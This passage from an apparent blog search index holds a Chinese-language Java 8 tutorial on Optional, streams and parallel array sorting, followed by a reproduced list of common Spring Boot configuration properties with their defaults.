= Optional.of( \"Tom\" );System.out.println( \"First Name is set? \" + firstName.isPresent() ); System.out.println( \"First Name: \" + firstName.orElseGet( () -&gt; \"[none]\" ) ); System.out.println( firstName.map( s -&gt; \"Hey \" + s + \"!\" ).orElse( \"Hey Stranger!\" ) );System.out.println(); 这个例子的输出是： 123First Name is set? trueFirst Name: TomHey Tom! 如果想了解更多的细节，请参考官方文档。 6. Streams新增的Stream API（java.util.stream）将生成环境的函数式编程引入了Java库中。这是目前为止最大的一次对Java库的完善，以便开发者能够写出更加有效、更加简洁和紧凑的代码。 Steam API极大得简化了集合操作（后面我们会看到不止是集合），首先看下这个叫Task的类： 12345678910111213141516171819202122232425262728public class Streams &#123; private enum Status &#123; OPEN, CLOSED &#125;; private static final class Task &#123; private final Status status; private final Integer points; Task( final Status status, final Integer points ) &#123; this.status = status; this.points = points; &#125; public Integer getPoints() &#123; return points; &#125; public Status getStatus() &#123; return status; &#125; @Override public String toString() &#123; return String.format( \"[%s, %d]\", status, points ); &#125; &#125;&#125; Task类有一个points属性，另外还有两种状态：OPEN或者CLOSED。现在假设有一个task集合： 12345final Collection&lt; Task &gt; tasks = Arrays.asList( new Task( Status.OPEN, 5 ), new Task( Status.OPEN, 13 ), new Task( Status.CLOSED, 8 ) ); 首先看一个问题：在这个task集合中一共有多少个OPEN状态的？计算出它们的points属性和。在Java 8之前，要解决这个问题，则需要使用foreach循环遍历task集合；但是在Java 8中可以利用steams解决：包括一系列元素的列表，并且支持顺序和并行处理。 12345678// Calculate total points of all active tasks using sum()final long totalPointsOfOpenTasks = tasks .stream() .filter( task -&gt; task.getStatus() == Status.OPEN ) .mapToInt( Task::getPoints ) .sum();System.out.println( \"Total points: \" + totalPointsOfOpenTasks ); 运行这个方法的控制台输出是： 1Total points: 18 这里有很多知识点值得说。首先，tasks集合被转换成steam表示；其次，在steam上的filter操作会过滤掉所有CLOSED的task；第三，mapToInt操作基于tasks集合中的每个task实例的Task::getPoints方法将task流转换成Integer集合；最后，通过sum方法计算总和，得出最后的结果。 在学习下一个例子之前，还需要记住一些steams（点此更多细节）的知识点。Steam之上的操作可分为中间操作和晚期操作。 中间操作会返回一个新的steam——执行一个中间操作（例如filter）并不会执行实际的过滤操作，而是创建一个新的steam，并将原steam中符合条件的元素放入新创建的steam。 晚期操作（例如forEach或者sum），会遍历steam并得出结果或者附带结果；在执行晚期操作之后，steam处理线已经处理完毕，就不能使用了。在几乎所有情况下，晚期操作都是立刻对steam进行遍历。 steam的另一个价值是创造性地支持并行处理（parallel processing）。对于上述的tasks集合，我们可以用下面的代码计算所有task的points之和： 12345678// Calculate total points of all tasksfinal double totalPoints = tasks .stream() .parallel() .map( task -&gt; task.getPoints() ) // or map( Task::getPoints ) .reduce( 0, Integer::sum );System.out.println( \"Total points (all tasks): \" + totalPoints ); 这里我们使用parallel方法并行处理所有的task，并使用reduce方法计算最终的结果。控制台输出如下： 1Total points（all tasks）: 26.0 对于一个集合，经常需要根据某些条件对其中的元素分组。利用steam提供的API可以很快完成这类任务，代码如下： 12345// Group tasks by their statusfinal Map&lt; Status, List&lt; Task &gt; &gt; map = tasks .stream() .collect( Collectors.groupingBy( Task::getStatus ) );System.out.println( map ); 控制台的输出如下： 1&#123;CLOSED=[[CLOSED, 8]], OPEN=[[OPEN, 5], [OPEN, 13]]&#125; 最后一个关于tasks集合的例子问题是：如何计算集合中每个任务的点数在集合中所占的比重，具体处理的代码如下： 123456789101112// Calculate the weight of each tasks (as percent of total points) final Collection&lt; String &gt; result = tasks .stream() // Stream&lt; String &gt; .mapToInt( Task::getPoints ) // IntStream .asLongStream() // LongStream .mapToDouble( points -&gt; points / totalPoints ) // DoubleStream .boxed() // Stream&lt; Double &gt; .mapToLong( weigth -&gt; ( long )( weigth * 100 ) ) // LongStream .mapToObj( percentage -&gt; percentage + \"%\" ) // Stream&lt; String&gt; .collect( Collectors.toList() ); // List&lt; String &gt; System.out.println( result ); 控制台输出结果如下： 1[19%, 50%, 30%] 最后，正如之前所说，Steam API不仅可以作用于Java集合，传统的IO操作（从文件或者网络一行一行得读取数据）可以受益于steam处理，这里有一个小例子： 1234final Path path = new File( filename ).toPath();try( Stream&lt; String &gt; lines = Files.lines( path, StandardCharsets.UTF_8 ) ) &#123; lines.onClose( () -&gt; System.out.println(\"Done!\") ).forEach( System.out::println );&#125; Stream的方法onClose() 返回一个等价的有额外句柄的Stream，当Stream的close()方法被调用的时候这个句柄会被执行。Stream API、Lambda表达式还有接口默认方法和静态方法支持的方法引用，是Java 8对软件开发的现代范式的响应。 7. 并行数组Java8版本新增了很多新的方法，用于支持并行数组处理。最重要的方法是parallelSort()，可以显著加快多核机器上的数组排序。下面的例子论证了parallexXxx系列的方法： 123456789101112131415161718192021package com.javacodegeeks.java8.parallel.arrays;import java.util.Arrays;import java.util.concurrent.ThreadLocalRandom;public class ParallelArrays &#123; public static void main( String[] args ) &#123; long[] arrayOfLong = new long [ 20000 ]; Arrays.parallelSetAll( arrayOfLong, index -&gt; ThreadLocalRandom.current().nextInt( 1000000 ) ); Arrays.stream( arrayOfLong ).limit( 10 ).forEach( i -&gt; System.out.print( i + \" \" ) ); System.out.println(); Arrays.parallelSort( arrayOfLong ); Arrays.stream( arrayOfLong ).limit( 10 ).forEach( i -&gt; System.out.print( i + \" \" ) ); System.out.println(); &#125;&#125; 上述这些代码使用parallelSetAll()方法生成20000个随机数，然后使用parallelSort()方法进行排序。这个程序会输出乱序数组和排序数组的前10个元素。上述例子的代码输出的结果是： 12Unsorted: 591217 891976 443951 424479 766825 351964 242997 642839 119108 552378 Sorted: 39 220 263 268 325 607 655 678 723 793","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"SpringBoot全局属性","slug":"SpringBoot/SpringBoot全局属性","date":"2019-01-29T01:40:36.000Z","updated":"2021-12-28T03:24:10.191Z","comments":true,"path":"SpringBoot/SpringBoot全局属性/","link":"","permalink":"http://yoursite.com/SpringBoot/SpringBoot全局属性/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946947948949950951952953954955956957958959960961962963964965966967968969970971972973974975976977978979980981982983984985986987988989990991992993994995996997998999100010011002100310041005100610071008100910101011101210131014101510161017101810191020102110221023102410251026102710281029103010311032103310341035103610371038103910401041104210431044104510461047104810491050105110521053105410551056105710581059106010611062106310641065106610671068106910701071107210731074107510761077107810791080108110821083108410851086108710881089109010911092109310941095109610971098109911001101110211031104110511061107110811091110111111121113111411151116111711181119112011211122112311241125112611271128112911301131113211331134113511361137113811391140114111421143114411451146114711481149115011511152115311541155115611571158115911601161116211631164116511661167116811691170117111721173117411751176117711781179118011811182118311841185118611871188118911901191119211931194119511961197119811991200120112021203120412051206120712081209121012111212121312141215121612171218121912201221122212231224122512261227122812291230123112321233123412351236123712381239124012411242124312441245124612471248124912501251125212531254125512561257125812591260126112621263126412651266126712681269127012711272127312741275127612771278127912801281128212831284128512861287128812891290129112921293129412951296129712981299130013011302130313041305130613071308130913101311131213131314131513161317131813191320132113221323132413251326132713281329133013311332133313341335133613371338133913401341134213431344134513461347134813491350135113521353135413551356135713581359136013611362136313641365136613671368136913701371137213731374137513761377137813791380138113821383138413851386138713881389139013911392139313941395139613971398139914001401140214031404140514061407140814091410141114121413141414151416141714181419142014211422142314241425# ===================================================================# COMMON SPRING BOOT PROPERTIES## This sample file is provided as a guideline. Do NOT copy it in its# entirety to your own application. ^^^# ===================================================================# ----------------------------------------# CORE PROPERTIES# ----------------------------------------debug=false # Enable debug logs.trace=false # Enable trace logs.# LOGGINGlogging.config= # Location of the logging configuration file. For instance, `classpath:logback.xml` for Logback.logging.exception-conversion-word=%wEx # Conversion word used when logging exceptions.logging.file= # Log file name (for instance, `myapp.log`). Names can be an exact location or relative to the current directory.logging.file.max-history=0 # Maximum of archive log files to keep. Only supported with the default logback setup.logging.file.max-size=10MB # Maximum log file size. Only supported with the default logback setup.logging.level.*= # Log levels severity mapping. For instance, `logging.level.org.springframework=DEBUG`.logging.path= # Location of the log file. For instance, `/var/log`.logging.pattern.console= # Appender pattern for output to the console. Supported only with the default Logback setup.logging.pattern.dateformat=yyyy-MM-dd HH:mm:ss.SSS # Appender pattern for log date format. Supported only with the default Logback setup.logging.pattern.file= # Appender pattern for output to a file. Supported only with the default Logback setup.logging.pattern.level=%5p # Appender pattern for log level. Supported only with the default Logback setup.logging.register-shutdown-hook=false # Register a shutdown hook for the logging system when it is initialized.# AOPspring.aop.auto=true # Add @EnableAspectJAutoProxy.spring.aop.proxy-target-class=true # Whether subclass-based (CGLIB) proxies are to be created (true), as opposed to standard Java interface-based proxies (false).# IDENTITY (ContextIdApplicationContextInitializer)spring.application.name= # Application name.# ADMIN (SpringApplicationAdminJmxAutoConfiguration)spring.application.admin.enabled=false # Whether to enable admin features for the application.spring.application.admin.jmx-name=org.springframework.boot:type=Admin,name=SpringApplication # JMX name of the application admin MBean.# AUTO-CONFIGURATIONspring.autoconfigure.exclude= # Auto-configuration classes to exclude.# BANNERspring.banner.charset=UTF-8 # Banner file encoding.spring.banner.location=classpath:banner.txt # Banner text resource location.spring.banner.image.location=classpath:banner.gif # Banner image file location (jpg or png can also be used).spring.banner.image.width=76 # Width of the banner image in chars.spring.banner.image.height= # Height of the banner image in chars (default based on image height).spring.banner.image.margin=2 # Left hand image margin in chars.spring.banner.image.invert=false # Whether images should be inverted for dark terminal themes.# SPRING COREspring.beaninfo.ignore=true # Whether to skip search of BeanInfo classes.# SPRING CACHE (CacheProperties)spring.cache.cache-names= # Comma-separated list of cache names to create if supported by the underlying cache manager.spring.cache.caffeine.spec= # The spec to use to create caches. See CaffeineSpec for more details on the spec format.spring.cache.couchbase.expiration=0ms # Entry expiration. By default the entries never expire. Note that this value is ultimately converted to seconds.spring.cache.ehcache.config= # The location of the configuration file to use to initialize EhCache.spring.cache.infinispan.config= # The location of the configuration file to use to initialize Infinispan.spring.cache.jcache.config= # The location of the configuration file to use to initialize the cache manager.spring.cache.jcache.provider= # Fully qualified name of the CachingProvider implementation to use to retrieve the JSR-107 compliant cache manager. Needed only if more than one JSR-107 implementation is available on the classpath.spring.cache.redis.cache-null-values=true # Allow caching null values.spring.cache.redis.key-prefix= # Key prefix.spring.cache.redis.time-to-live=0ms # Entry expiration. By default the entries never expire.spring.cache.redis.use-key-prefix=true # Whether to use the key prefix when writing to Redis.spring.cache.type= # Cache type. By default, auto-detected according to the environment.# SPRING CONFIG - using environment property only (ConfigFileApplicationListener)spring.config.additional-location= # Config file locations used in addition to the defaults.spring.config.location= # Config file locations that replace the defaults.spring.config.name=application # Config file name.# HAZELCAST (HazelcastProperties)spring.hazelcast.config= # The location of the configuration file to use to initialize Hazelcast.# PROJECT INFORMATION (ProjectInfoProperties)spring.info.build.location=classpath:META-INF/build-info.properties # Location of the generated build-info.properties file.spring.info.git.location=classpath:git.properties # Location of the generated git.properties file.# JMXspring.jmx.default-domain= # JMX domain name.spring.jmx.enabled=true # Expose management beans to the JMX domain.spring.jmx.server=mbeanServer # MBeanServer bean name.# Email (MailProperties)spring.mail.default-encoding=UTF-8 # Default MimeMessage encoding.spring.mail.host= # SMTP server host. For instance, `smtp.example.com`.spring.mail.jndi-name= # Session JNDI name. When set, takes precedence over other mail settings.spring.mail.password= # Login password of the SMTP server.spring.mail.port= # SMTP server port.spring.mail.properties.*= # Additional JavaMail session properties.spring.mail.protocol=smtp # Protocol used by the SMTP server.spring.mail.test-connection=false # Whether to test that the mail server is available on startup.spring.mail.username= # Login user of the SMTP server.# APPLICATION SETTINGS (SpringApplication)spring.main.banner-mode=console # Mode used to display the banner when the application runs.spring.main.sources= # Sources (class names, package names, or XML resource locations) to include in the ApplicationContext.spring.main.web-application-type= # Flag to explicitly request a specific type of web application. If not set, auto-detected based on the classpath.# FILE ENCODING (FileEncodingApplicationListener)spring.mandatory-file-encoding= # Expected character encoding the application must use.# INTERNATIONALIZATION (MessageSourceProperties)spring.messages.always-use-message-format=false # Whether to always apply the MessageFormat rules, parsing even messages without arguments.spring.messages.basename=messages # Comma-separated list of basenames (essentially a fully-qualified classpath location), each following the ResourceBundle convention with relaxed support for slash based locations.spring.messages.cache-duration= # Loaded resource bundle files cache duration. When not set, bundles are cached forever. If a duration suffix is not specified, seconds will be used.spring.messages.encoding=UTF-8 # Message bundles encoding.spring.messages.fallback-to-system-locale=true # Whether to fall back to the system Locale if no files for a specific Locale have been found.spring.messages.use-code-as-default-message=false # Whether to use the message code as the default message instead of throwing a &quot;NoSuchMessageException&quot;. Recommended during development only.# OUTPUTspring.output.ansi.enabled=detect # Configures the ANSI output.# PID FILE (ApplicationPidFileWriter)spring.pid.fail-on-write-error= # Fails if ApplicationPidFileWriter is used but it cannot write the PID file.spring.pid.file= # Location of the PID file to write (if ApplicationPidFileWriter is used).# PROFILESspring.profiles.active= # Comma-separated list of active profiles. Can be overridden by a command line switch.spring.profiles.include= # Unconditionally activate the specified comma-separated list of profiles (or list of profiles if using YAML).# QUARTZ SCHEDULER (QuartzProperties)spring.quartz.jdbc.initialize-schema=embedded # Database schema initialization mode.spring.quartz.jdbc.schema=classpath:org/quartz/impl/jdbcjobstore/tables_@@platform@@.sql # Path to the SQL file to use to initialize the database schema.spring.quartz.job-store-type=memory # Quartz job store type.spring.quartz.properties.*= # Additional Quartz Scheduler properties.# REACTOR (ReactorCoreProperties)spring.reactor.stacktrace-mode.enabled=false # Whether Reactor should collect stacktrace information at runtime.# SENDGRID (SendGridAutoConfiguration)spring.sendgrid.api-key= # SendGrid API key.spring.sendgrid.proxy.host= # SendGrid proxy host.spring.sendgrid.proxy.port= # SendGrid proxy port.# ----------------------------------------# WEB PROPERTIES# ----------------------------------------# EMBEDDED SERVER CONFIGURATION (ServerProperties)server.address= # Network address to which the server should bind.server.compression.enabled=false # Whether response compression is enabled.server.compression.excluded-user-agents= # List of user-agents to exclude from compression.server.compression.mime-types=text/html,text/xml,text/plain,text/css,text/javascript,application/javascript # Comma-separated list of MIME types that should be compressed.server.compression.min-response-size=2048 # Minimum &quot;Content-Length&quot; value that is required for compression to be performed.server.connection-timeout= # Time that connectors wait for another HTTP request before closing the connection. When not set, the connector&apos;s container-specific default is used. Use a value of -1 to indicate no (that is, an infinite) timeout.server.error.include-exception=false # Include the &quot;exception&quot; attribute.server.error.include-stacktrace=never # When to include a &quot;stacktrace&quot; attribute.server.error.path=/error # Path of the error controller.server.error.whitelabel.enabled=true # Whether to enable the default error page displayed in browsers in case of a server error.server.http2.enabled=false # Whether to enable HTTP/2 support, if the current environment supports it.server.jetty.acceptors= # Number of acceptor threads to use.server.jetty.accesslog.append=false # Append to log.server.jetty.accesslog.date-format=dd/MMM/yyyy:HH:mm:ss Z # Timestamp format of the request log.server.jetty.accesslog.enabled=false # Enable access log.server.jetty.accesslog.extended-format=false # Enable extended NCSA format.server.jetty.accesslog.file-date-format= # Date format to place in log file name.server.jetty.accesslog.filename= # Log filename. If not specified, logs redirect to &quot;System.err&quot;.server.jetty.accesslog.locale= # Locale of the request log.server.jetty.accesslog.log-cookies=false # Enable logging of the request cookies.server.jetty.accesslog.log-latency=false # Enable logging of request processing time.server.jetty.accesslog.log-server=false # Enable logging of the request hostname.server.jetty.accesslog.retention-period=31 # Number of days before rotated log files are deleted.server.jetty.accesslog.time-zone=GMT # Timezone of the request log.server.jetty.max-http-post-size=0 # Maximum size, in bytes, of the HTTP post or put content.server.jetty.selectors= # Number of selector threads to use.server.max-http-header-size=0 # Maximum size, in bytes, of the HTTP message header.server.port=8080 # Server HTTP port.server.server-header= # Value to use for the Server response header (if empty, no header is sent).server.use-forward-headers= # Whether X-Forwarded-* headers should be applied to the HttpRequest.server.servlet.context-parameters.*= # Servlet context init parameters.server.servlet.context-path= # Context path of the application.server.servlet.application-display-name=application # Display name of the application.server.servlet.jsp.class-name=org.apache.jasper.servlet.JspServlet # The class name of the JSP servlet.server.servlet.jsp.init-parameters.*= # Init parameters used to configure the JSP servlet.server.servlet.jsp.registered=true # Whether the JSP servlet is registered.server.servlet.path=/ # Path of the main dispatcher servlet.server.servlet.session.cookie.comment= # Comment for the session cookie.server.servlet.session.cookie.domain= # Domain for the session cookie.server.servlet.session.cookie.http-only= # &quot;HttpOnly&quot; flag for the session cookie.server.servlet.session.cookie.max-age= # Maximum age of the session cookie. If a duration suffix is not specified, seconds will be used.server.servlet.session.cookie.name= # Session cookie name.server.servlet.session.cookie.path= # Path of the session cookie.server.servlet.session.cookie.secure= # &quot;Secure&quot; flag for the session cookie.server.servlet.session.persistent=false # Whether to persist session data between restarts.server.servlet.session.store-dir= # Directory used to store session data.server.servlet.session.timeout= # Session timeout. If a duration suffix is not specified, seconds will be used.server.servlet.session.tracking-modes= # Session tracking modes (one or more of the following: &quot;cookie&quot;, &quot;url&quot;, &quot;ssl&quot;).server.ssl.ciphers= # Supported SSL ciphers.server.ssl.client-auth= # Whether client authentication is wanted (&quot;want&quot;) or needed (&quot;need&quot;). Requires a trust store.server.ssl.enabled= # Enable SSL support.server.ssl.enabled-protocols= # Enabled SSL protocols.server.ssl.key-alias= # Alias that identifies the key in the key store.server.ssl.key-password= # Password used to access the key in the key store.server.ssl.key-store= # Path to the key store that holds the SSL certificate (typically a jks file).server.ssl.key-store-password= # Password used to access the key store.server.ssl.key-store-provider= # Provider for the key store.server.ssl.key-store-type= # Type of the key store.server.ssl.protocol=TLS # SSL protocol to use.server.ssl.trust-store= # Trust store that holds SSL certificates.server.ssl.trust-store-password= # Password used to access the trust store.server.ssl.trust-store-provider= # Provider for the trust store.server.ssl.trust-store-type= # Type of the trust store.server.tomcat.accept-count=0 # Maximum queue length for incoming connection requests when all possible request processing threads are in use.server.tomcat.accesslog.buffered=true # Whether to buffer output such that it is flushed only periodically.server.tomcat.accesslog.directory=logs # Directory in which log files are created. Can be absolute or relative to the Tomcat base dir.server.tomcat.accesslog.enabled=false # Enable access log.server.tomcat.accesslog.file-date-format=.yyyy-MM-dd # Date format to place in the log file name.server.tomcat.accesslog.pattern=common # Format pattern for access logs.server.tomcat.accesslog.prefix=access_log # Log file name prefix.server.tomcat.accesslog.rename-on-rotate=false # Whether to defer inclusion of the date stamp in the file name until rotate time.server.tomcat.accesslog.request-attributes-enabled=false # Set request attributes for the IP address, Hostname, protocol, and port used for the request.server.tomcat.accesslog.rotate=true # Whether to enable access log rotation.server.tomcat.accesslog.suffix=.log # Log file name suffix.server.tomcat.additional-tld-skip-patterns= # Comma-separated list of additional patterns that match jars to ignore for TLD scanning.server.tomcat.background-processor-delay=30s # Delay between the invocation of backgroundProcess methods. If a duration suffix is not specified, seconds will be used.server.tomcat.basedir= # Tomcat base directory. If not specified, a temporary directory is used.server.tomcat.internal-proxies=10\\\\.\\\\d&#123;1,3&#125;\\\\.\\\\d&#123;1,3&#125;\\\\.\\\\d&#123;1,3&#125;|\\\\ 192\\\\.168\\\\.\\\\d&#123;1,3&#125;\\\\.\\\\d&#123;1,3&#125;|\\\\ 169\\\\.254\\\\.\\\\d&#123;1,3&#125;\\\\.\\\\d&#123;1,3&#125;|\\\\ 127\\\\.\\\\d&#123;1,3&#125;\\\\.\\\\d&#123;1,3&#125;\\\\.\\\\d&#123;1,3&#125;|\\\\ 172\\\\.1[6-9]&#123;1&#125;\\\\.\\\\d&#123;1,3&#125;\\\\.\\\\d&#123;1,3&#125;|\\\\ 172\\\\.2[0-9]&#123;1&#125;\\\\.\\\\d&#123;1,3&#125;\\\\.\\\\d&#123;1,3&#125;|\\\\ 172\\\\.3[0-1]&#123;1&#125;\\\\.\\\\d&#123;1,3&#125;\\\\.\\\\d&#123;1,3&#125; # Regular expression matching trusted IP addresses.server.tomcat.max-connections=0 # Maximum number of connections that the server accepts and processes at any given time.server.tomcat.max-http-header-size=0 # Maximum size, in bytes, of the HTTP message header.server.tomcat.max-http-post-size=0 # Maximum size, in bytes, of the HTTP post content.server.tomcat.max-threads=0 # Maximum number of worker threads.server.tomcat.min-spare-threads=0 # Minimum number of worker threads.server.tomcat.port-header=X-Forwarded-Port # Name of the HTTP header used to override the original port value.server.tomcat.protocol-header= # Header that holds the incoming protocol, usually named &quot;X-Forwarded-Proto&quot;.server.tomcat.protocol-header-https-value=https # Value of the protocol header indicating whether the incoming request uses SSL.server.tomcat.redirect-context-root= # Whether requests to the context root should be redirected by appending a / to the path.server.tomcat.remote-ip-header= # Name of the HTTP header from which the remote IP is extracted. For instance, `X-FORWARDED-FOR`.server.tomcat.resource.cache-ttl= # Time-to-live of the static resource cache.server.tomcat.uri-encoding=UTF-8 # Character encoding to use to decode the URI.server.tomcat.use-relative-redirects= # Whether HTTP 1.1 and later location headers generated by a call to sendRedirect will use relative or absolute redirects.server.undertow.accesslog.dir= # Undertow access log directory.server.undertow.accesslog.enabled=false # Whether to enable the access log.server.undertow.accesslog.pattern=common # Format pattern for access logs.server.undertow.accesslog.prefix=access_log. # Log file name prefix.server.undertow.accesslog.rotate=true # Whether to enable access log rotation.server.undertow.accesslog.suffix=log # Log file name suffix.server.undertow.buffer-size= # Size of each buffer, in bytes.server.undertow.direct-buffers= # Whether to allocate buffers outside the Java heap.server.undertow.io-threads= # Number of I/O threads to create for the worker.server.undertow.eager-filter-init=true # Whether servlet filters should be initialized on startup.server.undertow.max-http-post-size=0 # Maximum size, in bytes, of the HTTP post content.server.undertow.worker-threads= # Number of worker threads.# FREEMARKER (FreeMarkerProperties)spring.freemarker.allow-request-override=false # Whether HttpServletRequest attributes are allowed to override (hide) controller generated model attributes of the same name.spring.freemarker.allow-session-override=false # Whether HttpSession attributes are allowed to override (hide) controller generated model attributes of the same name.spring.freemarker.cache=false # Whether to enable template caching.spring.freemarker.charset=UTF-8 # Template encoding.spring.freemarker.check-template-location=true # Whether to check that the templates location exists.spring.freemarker.content-type=text/html # Content-Type value.spring.freemarker.enabled=true # Whether to enable MVC view resolution for this technology.spring.freemarker.expose-request-attributes=false # Whether all request attributes should be added to the model prior to merging with the template.spring.freemarker.expose-session-attributes=false # Whether all HttpSession attributes should be added to the model prior to merging with the template.spring.freemarker.expose-spring-macro-helpers=true # Whether to expose a RequestContext for use by Spring&apos;s macro library, under the name &quot;springMacroRequestContext&quot;.spring.freemarker.prefer-file-system-access=true # Whether to prefer file system access for template loading. File system access enables hot detection of template changes.spring.freemarker.prefix= # Prefix that gets prepended to view names when building a URL.spring.freemarker.request-context-attribute= # Name of the RequestContext attribute for all views.spring.freemarker.settings.*= # Well-known FreeMarker keys which are passed to FreeMarker&apos;s Configuration.spring.freemarker.suffix=.ftl # Suffix that gets appended to view names when building a URL.spring.freemarker.template-loader-path=classpath:/templates/ # Comma-separated list of template paths.spring.freemarker.view-names= # White list of view names that can be resolved.# GROOVY TEMPLATES (GroovyTemplateProperties)spring.groovy.template.allow-request-override=false # Whether HttpServletRequest attributes are allowed to override (hide) controller generated model attributes of the same name.spring.groovy.template.allow-session-override=false # Whether HttpSession attributes are allowed to override (hide) controller generated model attributes of the same name.spring.groovy.template.cache=false # Whether to enable template caching.spring.groovy.template.charset=UTF-8 # Template encoding.spring.groovy.template.check-template-location=true # Whether to check that the templates location exists.spring.groovy.template.configuration.*= # See GroovyMarkupConfigurerspring.groovy.template.content-type=text/html # Content-Type value.spring.groovy.template.enabled=true # Whether to enable MVC view resolution for this technology.spring.groovy.template.expose-request-attributes=false # Whether all request attributes should be added to the model prior to merging with the template.spring.groovy.template.expose-session-attributes=false # Whether all HttpSession attributes should be added to the model prior to merging with the template.spring.groovy.template.expose-spring-macro-helpers=true # Whether to expose a RequestContext for use by Spring&apos;s macro library, under the name &quot;springMacroRequestContext&quot;.spring.groovy.template.prefix= # Prefix that gets prepended to view names when building a URL.spring.groovy.template.request-context-attribute= # Name of the RequestContext attribute for all views.spring.groovy.template.resource-loader-path=classpath:/templates/ # Template path.spring.groovy.template.suffix=.tpl # Suffix that gets appended to view names when building a URL.spring.groovy.template.view-names= # White list of view names that can be resolved.# SPRING HATEOAS (HateoasProperties)spring.hateoas.use-hal-as-default-json-media-type=true # Whether application/hal+json responses should be sent to requests that accept application/json.# HTTP message conversionspring.http.converters.preferred-json-mapper= # Preferred JSON mapper to use for HTTP message conversion. By default, auto-detected according to the environment.# HTTP encoding (HttpEncodingProperties)spring.http.encoding.charset=UTF-8 # Charset of HTTP requests and responses. Added to the &quot;Content-Type&quot; header if not set explicitly.spring.http.encoding.enabled=true # Whether to enable http encoding support.spring.http.encoding.force= # Whether to force the encoding to the configured charset on HTTP requests and responses.spring.http.encoding.force-request= # Whether to force the encoding to the configured charset on HTTP requests. Defaults to true when &quot;force&quot; has not been specified.spring.http.encoding.force-response= # Whether to force the encoding to the configured charset on HTTP responses.spring.http.encoding.mapping= # Locale in which to encode mapping.# MULTIPART (MultipartProperties)spring.servlet.multipart.enabled=true # Whether to enable support of multipart uploads.spring.servlet.multipart.file-size-threshold=0 # Threshold after which files are written to disk. Values can use the suffixes &quot;MB&quot; or &quot;KB&quot; to indicate megabytes or kilobytes, respectively.spring.servlet.multipart.location= # Intermediate location of uploaded files.spring.servlet.multipart.max-file-size=1MB # Max file size. Values can use the suffixes &quot;MB&quot; or &quot;KB&quot; to indicate megabytes or kilobytes, respectively.spring.servlet.multipart.max-request-size=10MB # Max request size. Values can use the suffixes &quot;MB&quot; or &quot;KB&quot; to indicate megabytes or kilobytes, respectively.spring.servlet.multipart.resolve-lazily=false # Whether to resolve the multipart request lazily at the time of file or parameter access.# JACKSON (JacksonProperties)spring.jackson.date-format= # Date format string or a fully-qualified date format class name. For instance, `yyyy-MM-dd HH:mm:ss`.spring.jackson.default-property-inclusion= # Controls the inclusion of properties during serialization. Configured with one of the values in Jackson&apos;s JsonInclude.Include enumeration.spring.jackson.deserialization.*= # Jackson on/off features that affect the way Java objects are deserialized.spring.jackson.generator.*= # Jackson on/off features for generators.spring.jackson.joda-date-time-format= # Joda date time format string. If not configured, &quot;date-format&quot; is used as a fallback if it is configured with a format string.spring.jackson.locale= # Locale used for formatting.spring.jackson.mapper.*= # Jackson general purpose on/off features.spring.jackson.parser.*= # Jackson on/off features for parsers.spring.jackson.property-naming-strategy= # One of the constants on Jackson&apos;s PropertyNamingStrategy. Can also be a fully-qualified class name of a PropertyNamingStrategy subclass.spring.jackson.serialization.*= # Jackson on/off features that affect the way Java objects are serialized.spring.jackson.time-zone= # Time zone used when formatting dates. For instance, &quot;America/Los_Angeles&quot; or &quot;GMT+10&quot;.# GSON (GsonProperties)spring.gson.date-format= # Format to use when serializing Date objects.spring.gson.disable-html-escaping= # Whether to disable the escaping of HTML characters such as &apos;&lt;&apos;, &apos;&gt;&apos;, etc.spring.gson.disable-inner-class-serialization= # Whether to exclude inner classes during serialization.spring.gson.enable-complex-map-key-serialization= # Whether to enable serialization of complex map keys (i.e. non-primitives).spring.gson.exclude-fields-without-expose-annotation= # Whether to exclude all fields from consideration for serialization or deserialization that do not have the &quot;Expose&quot; annotation.spring.gson.field-naming-policy= # Naming policy that should be applied to an object&apos;s field during serialization and deserialization.spring.gson.generate-non-executable-json= # Whether to generate non executable JSON by prefixing the output with some special text.spring.gson.lenient= # Whether to be lenient about parsing JSON that doesn&apos;t conform to RFC 4627.spring.gson.long-serialization-policy= # Serialization policy for Long and long types.spring.gson.pretty-printing= # Whether to output serialized JSON that fits in a page for pretty printing.spring.gson.serialize-nulls= # Whether to serialize null fields.# JERSEY (JerseyProperties)spring.jersey.application-path= # Path that serves as the base URI for the application. If specified, overrides the value of &quot;@ApplicationPath&quot;.spring.jersey.filter.order=0 # Jersey filter chain order.spring.jersey.init.*= # Init parameters to pass to Jersey through the servlet or filter.spring.jersey.servlet.load-on-startup=-1 # Load on startup priority of the Jersey servlet.spring.jersey.type=servlet # Jersey integration type.# SPRING LDAP (LdapProperties)spring.ldap.anonymous-read-only=false # Whether read-only operations should use an anonymous environment.spring.ldap.base= # Base suffix from which all operations should originate.spring.ldap.base-environment.*= # LDAP specification settings.spring.ldap.password= # Login password of the server.spring.ldap.urls= # LDAP URLs 